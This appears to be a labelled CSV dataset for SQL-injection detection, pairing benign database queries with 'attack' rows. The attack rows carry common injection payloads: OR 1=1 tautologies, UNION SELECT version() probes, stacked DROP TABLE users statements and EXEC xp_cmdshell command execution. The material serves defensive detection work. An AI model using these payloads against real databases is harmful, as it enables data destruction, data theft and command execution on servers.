query,label
DELETE FROM sessions WHERE session_id='' AND 1=(SELECT COUNT(*) FROM tab); --';,attack
"DELETE FROM sessions WHERE session_id='' UNION SELECT NULL, version(), NULL --';",attack
SELECT * FROM users WHERE id='' OR 1=1--';,attack
"SELECT name, email FROM customers WHERE email='' AND 1=(SELECT COUNT(*) FROM tab); --';",attack
UPDATE products SET price=' OR '1'='1 WHERE id='{}';,attack
UPDATE products SET price=127 WHERE id='340';,benign
"SELECT name, email FROM customers WHERE email='' OR '1'='1';",attack
UPDATE products SET price=237 WHERE id='160';,benign
UPDATE products SET price=207 WHERE id='310';,benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('290', '708', 777);",benign
"UPDATE products SET price=' UNION SELECT NULL, version(), NULL -- WHERE id='{}';",attack
UPDATE products SET price='; DROP TABLE users; -- WHERE id='{}';,attack
UPDATE products SET price=' OR 1=1-- WHERE id='{}';,attack
SELECT * FROM users WHERE id='494';,benign
SELECT * FROM users WHERE id='690';,benign
"SELECT name, email FROM customers WHERE email='466';",benign
"SELECT name, email FROM customers WHERE email='873';",benign
UPDATE products SET price=378 WHERE id='260';,benign
"DELETE FROM sessions WHERE session_id='' UNION SELECT NULL, version(), NULL --';",attack
SELECT * FROM users WHERE id='' OR 1=1--';,attack
SELECT * FROM users WHERE id=''; DROP TABLE users; --';,attack
"SELECT name, email FROM customers WHERE email='' OR 1=1--';",attack
UPDATE products SET price=' OR 1=1-- WHERE id='{}';,attack
SELECT * FROM users WHERE id='' OR '1'='1';,attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('' OR 1=1--', '{}', {});",attack
DELETE FROM sessions WHERE session_id='' OR '1'='1';,attack
DELETE FROM sessions WHERE session_id='' OR '1'='1';,attack
"SELECT * FROM users WHERE id='' UNION SELECT NULL, version(), NULL --';",attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('' OR '1'='1', '{}', {});",attack
DELETE FROM sessions WHERE session_id=''; EXEC xp_cmdshell('dir'); --';,attack
DELETE FROM sessions WHERE session_id='' OR '1'='1';,attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('567', '441', 652);",benign
DELETE FROM sessions WHERE session_id='' OR 1=1--';,attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('984', '996', 218);",benign
SELECT * FROM users WHERE id='417';,benign
SELECT * FROM users WHERE id='924';,benign
DELETE FROM sessions WHERE session_id='947';,benign
DELETE FROM sessions WHERE session_id='' OR 1=1--';,attack
DELETE FROM sessions WHERE session_id=''; EXEC xp_cmdshell('dir'); --';,attack
DELETE FROM sessions WHERE session_id='486';,benign
DELETE FROM sessions WHERE session_id='533';,benign
DELETE FROM sessions WHERE session_id='207';,benign
DELETE FROM sessions WHERE session_id='' OR 1=1--';,attack
UPDATE products SET price=334 WHERE id='819';,benign
UPDATE products SET price=297 WHERE id='374';,benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('492', '177', 609);",benign
UPDATE products SET price=160 WHERE id='846';,benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('857', '677', 555);",benign
UPDATE products SET price=693 WHERE id='330';,benign
"SELECT name, email FROM customers WHERE email='418';",benign
DELETE FROM sessions WHERE session_id=''; EXEC xp_cmdshell('dir'); --';,attack
DELETE FROM sessions WHERE session_id='709';,benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('' OR '1'='1', '{}', {});",attack
"SELECT name, email FROM customers WHERE email='' UNION SELECT NULL, version(), NULL --';",attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('' UNION SELECT NULL, version(), NULL --', '{}', {});",attack
UPDATE products SET price=501 WHERE id='512';,benign
UPDATE products SET price=' AND 1=(SELECT COUNT(*) FROM tab); -- WHERE id='{}';,attack
DELETE FROM sessions WHERE session_id=''; DROP TABLE users; --';,attack
"SELECT name, email FROM customers WHERE email='' OR '1'='1';",attack
"SELECT name, email FROM customers WHERE email='876';",benign
DELETE FROM sessions WHERE session_id=''; EXEC xp_cmdshell('dir'); --';,attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('' OR '1'='1', '{}', {});",attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('664', '406', 829);",benign
DELETE FROM sessions WHERE session_id='80';,benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('' UNION SELECT NULL, version(), NULL --', '{}', {});",attack
"SELECT * FROM users WHERE id='' UNION SELECT NULL, version(), NULL --';",attack
DELETE FROM sessions WHERE session_id='' OR '1'='1';,attack
"SELECT name, email FROM customers WHERE email='384';",benign
UPDATE products SET price=433 WHERE id='226';,benign
SELECT * FROM users WHERE id='' OR '1'='1';,attack
UPDATE products SET price='; EXEC xp_cmdshell('dir'); -- WHERE id='{}';,attack
DELETE FROM sessions WHERE session_id=''; DROP TABLE users; --';,attack
UPDATE products SET price=' OR 1=1-- WHERE id='{}';,attack
SELECT * FROM users WHERE id='' OR '1'='1';,attack
SELECT * FROM users WHERE id='861';,benign
UPDATE products SET price=879 WHERE id='419';,benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('' UNION SELECT NULL, version(), NULL --', '{}', {});",attack
SELECT * FROM users WHERE id='' OR 1=1--';,attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('' OR '1'='1', '{}', {});",attack
"SELECT name, email FROM customers WHERE email='356';",benign
"SELECT name, email FROM customers WHERE email='774';",benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('' AND 1=(SELECT COUNT(*) FROM tab); --', '{}', {});",attack
SELECT * FROM users WHERE id='' OR '1'='1';,attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES (''; DROP TABLE users; --', '{}', {});",attack
SELECT * FROM users WHERE id='' OR 1=1--';,attack
"SELECT name, email FROM customers WHERE email='813';",benign
"SELECT name, email FROM customers WHERE email=''; EXEC xp_cmdshell('dir'); --';",attack
SELECT * FROM users WHERE id='' OR 1=1--';,attack
SELECT * FROM users WHERE id=''; DROP TABLE users; --';,attack
"UPDATE products SET price=' UNION SELECT NULL, version(), NULL -- WHERE id='{}';",attack
SELECT * FROM users WHERE id='15';,benign
"SELECT name, email FROM customers WHERE email='327';",benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('4', '599', 90);",benign
DELETE FROM sessions WHERE session_id='547';,benign
SELECT * FROM users WHERE id='' AND 1=(SELECT COUNT(*) FROM tab); --';,attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES (''; EXEC xp_cmdshell('dir'); --', '{}', {});",attack
SELECT * FROM users WHERE id=''; DROP TABLE users; --';,attack
"SELECT name, email FROM customers WHERE email=''; EXEC xp_cmdshell('dir'); --';",attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('958', '453', 146);",benign
"SELECT name, email FROM customers WHERE email=''; EXEC xp_cmdshell('dir'); --';",attack
UPDATE products SET price=609 WHERE id='101';,benign
"SELECT name, email FROM customers WHERE email='678';",benign
"SELECT * FROM users WHERE id='' UNION SELECT NULL, version(), NULL --';",attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES (''; EXEC xp_cmdshell('dir'); --', '{}', {});",attack
"SELECT name, email FROM customers WHERE email='' AND 1=(SELECT COUNT(*) FROM tab); --';",attack
DELETE FROM sessions WHERE session_id='620';,benign
SELECT * FROM users WHERE id='666';,benign
UPDATE products SET price='; DROP TABLE users; -- WHERE id='{}';,attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('219', '282', 337);",benign
SELECT * FROM users WHERE id=''; DROP TABLE users; --';,attack
SELECT * FROM users WHERE id='721';,benign
"SELECT name, email FROM customers WHERE email=''; EXEC xp_cmdshell('dir'); --';",attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('' OR '1'='1', '{}', {});",attack
"SELECT name, email FROM customers WHERE email='' OR 1=1--';",attack
SELECT * FROM users WHERE id='26';,benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('95', '19', 373);",benign
"SELECT name, email FROM customers WHERE email='79';",benign
"SELECT name, email FROM customers WHERE email='260';",benign
UPDATE products SET price=' OR 1=1-- WHERE id='{}';,attack
"SELECT name, email FROM customers WHERE email='' OR '1'='1';",attack
SELECT * FROM users WHERE id='' OR '1'='1';,attack
UPDATE products SET price=' OR 1=1-- WHERE id='{}';,attack
SELECT * FROM users WHERE id='986';,benign
"SELECT name, email FROM customers WHERE email='' UNION SELECT NULL, version(), NULL --';",attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('' UNION SELECT NULL, version(), NULL --', '{}', {});",attack
"UPDATE products SET price=' UNION SELECT NULL, version(), NULL -- WHERE id='{}';",attack
"SELECT name, email FROM customers WHERE email='373';",benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('' AND 1=(SELECT COUNT(*) FROM tab); --', '{}', {});",attack
UPDATE products SET price=' AND 1=(SELECT COUNT(*) FROM tab); -- WHERE id='{}';,attack
UPDATE products SET price=58 WHERE id='916';,benign
UPDATE products SET price='; DROP TABLE users; -- WHERE id='{}';,attack
"SELECT name, email FROM customers WHERE email='986';",benign
"SELECT name, email FROM customers WHERE email='' OR '1'='1';",attack
DELETE FROM sessions WHERE session_id=''; DROP TABLE users; --';,attack
"SELECT * FROM users WHERE id='' UNION SELECT NULL, version(), NULL --';",attack
SELECT * FROM users WHERE id='' OR '1'='1';,attack
UPDATE products SET price=408 WHERE id='518';,benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('745', '300', 995);",benign
DELETE FROM sessions WHERE session_id='995';,benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('826', '484', 445);",benign
UPDATE products SET price=' AND 1=(SELECT COUNT(*) FROM tab); -- WHERE id='{}';,attack
"SELECT name, email FROM customers WHERE email='' AND 1=(SELECT COUNT(*) FROM tab); --';",attack
UPDATE products SET price='; EXEC xp_cmdshell('dir'); -- WHERE id='{}';,attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('955', '186', 337);",benign
"SELECT name, email FROM customers WHERE email='' UNION SELECT NULL, version(), NULL --';",attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('' OR '1'='1', '{}', {});",attack
SELECT * FROM users WHERE id='' OR 1=1--';,attack
"SELECT * FROM users WHERE id='' UNION SELECT NULL, version(), NULL --';",attack
"SELECT name, email FROM customers WHERE email='' UNION SELECT NULL, version(), NULL --';",attack
"UPDATE products SET price=' UNION SELECT NULL, version(), NULL -- WHERE id='{}';",attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('367', '854', 210);",benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('1000', '491', 210);",benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('512', '404', 485);",benign
DELETE FROM sessions WHERE session_id='520';,benign
UPDATE products SET price='; EXEC xp_cmdshell('dir'); -- WHERE id='{}';,attack
SELECT * FROM users WHERE id='418';,benign
"SELECT name, email FROM customers WHERE email='' UNION SELECT NULL, version(), NULL --';",attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('379', '391', 372);",benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('565', '612', 974);",benign
"SELECT name, email FROM customers WHERE email='' OR 1=1--';",attack
DELETE FROM sessions WHERE session_id='341';,benign
"SELECT name, email FROM customers WHERE email=''; DROP TABLE users; --';",attack
SELECT * FROM users WHERE id=''; EXEC xp_cmdshell('dir'); --';,attack
DELETE FROM sessions WHERE session_id=''; DROP TABLE users; --';,attack
DELETE FROM sessions WHERE session_id='225';,benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('421', '400', 28);",benign
"SELECT name, email FROM customers WHERE email='' OR 1=1--';",attack
"SELECT name, email FROM customers WHERE email=''; EXEC xp_cmdshell('dir'); --';",attack
"SELECT name, email FROM customers WHERE email=''; EXEC xp_cmdshell('dir'); --';",attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('638', '302', 414);",benign
SELECT * FROM users WHERE id=''; DROP TABLE users; --';,attack
"SELECT name, email FROM customers WHERE email='913';",benign
DELETE FROM sessions WHERE session_id='259';,benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES (''; DROP TABLE users; --', '{}', {});",attack
SELECT * FROM users WHERE id='169';,benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('' OR '1'='1', '{}', {});",attack
"UPDATE products SET price=' UNION SELECT NULL, version(), NULL -- WHERE id='{}';",attack
DELETE FROM sessions WHERE session_id='612';,benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('69', '503', 334);",benign
DELETE FROM sessions WHERE session_id='200';,benign
"SELECT name, email FROM customers WHERE email='' UNION SELECT NULL, version(), NULL --';",attack
"UPDATE products SET price=' UNION SELECT NULL, version(), NULL -- WHERE id='{}';",attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('' UNION SELECT NULL, version(), NULL --', '{}', {});",attack
"UPDATE products SET price=' UNION SELECT NULL, version(), NULL -- WHERE id='{}';",attack
DELETE FROM sessions WHERE session_id='' OR '1'='1';,attack
"SELECT name, email FROM customers WHERE email='299';",benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('853', '939', 874);",benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('364', '863', 161);",benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('993', '158', 687);",benign
DELETE FROM sessions WHERE session_id=''; EXEC xp_cmdshell('dir'); --';,attack
UPDATE products SET price=' AND 1=(SELECT COUNT(*) FROM tab); -- WHERE id='{}';,attack
"SELECT name, email FROM customers WHERE email='' AND 1=(SELECT COUNT(*) FROM tab); --';",attack
"SELECT name, email FROM customers WHERE email='' AND 1=(SELECT COUNT(*) FROM tab); --';",attack
SELECT * FROM users WHERE id='615';,benign
UPDATE products SET price=2 WHERE id='653';,benign
SELECT * FROM users WHERE id='806';,benign
SELECT * FROM users WHERE id='427';,benign
SELECT * FROM users WHERE id=''; DROP TABLE users; --';,attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('949', '526', 379);",benign
SELECT * FROM users WHERE id='180';,benign
DELETE FROM sessions WHERE session_id='868';,benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('485', '909', 797);",benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('' UNION SELECT NULL, version(), NULL --', '{}', {});",attack
DELETE FROM sessions WHERE session_id='664';,benign
DELETE FROM sessions WHERE session_id=''; EXEC xp_cmdshell('dir'); --';,attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('626', '774', 585);",benign
DELETE FROM sessions WHERE session_id=''; EXEC xp_cmdshell('dir'); --';,attack
DELETE FROM sessions WHERE session_id=''; EXEC xp_cmdshell('dir'); --';,attack
"SELECT name, email FROM customers WHERE email='' AND 1=(SELECT COUNT(*) FROM tab); --';",attack
UPDATE products SET price='; DROP TABLE users; -- WHERE id='{}';,attack
UPDATE products SET price=180 WHERE id='690';,benign
SELECT * FROM users WHERE id=''; DROP TABLE users; --';,attack
"SELECT name, email FROM customers WHERE email='279';",benign
DELETE FROM sessions WHERE session_id='257';,benign
"SELECT name, email FROM customers WHERE email='930';",benign
UPDATE products SET price='; EXEC xp_cmdshell('dir'); -- WHERE id='{}';,attack
DELETE FROM sessions WHERE session_id='' AND 1=(SELECT COUNT(*) FROM tab); --';,attack
"DELETE FROM sessions WHERE session_id='' UNION SELECT NULL, version(), NULL --';",attack
"SELECT name, email FROM customers WHERE email='' OR 1=1--';",attack
UPDATE products SET price=349 WHERE id='363';,benign
UPDATE products SET price=160 WHERE id='303';,benign
DELETE FROM sessions WHERE session_id='902';,benign
DELETE FROM sessions WHERE session_id='' OR '1'='1';,attack
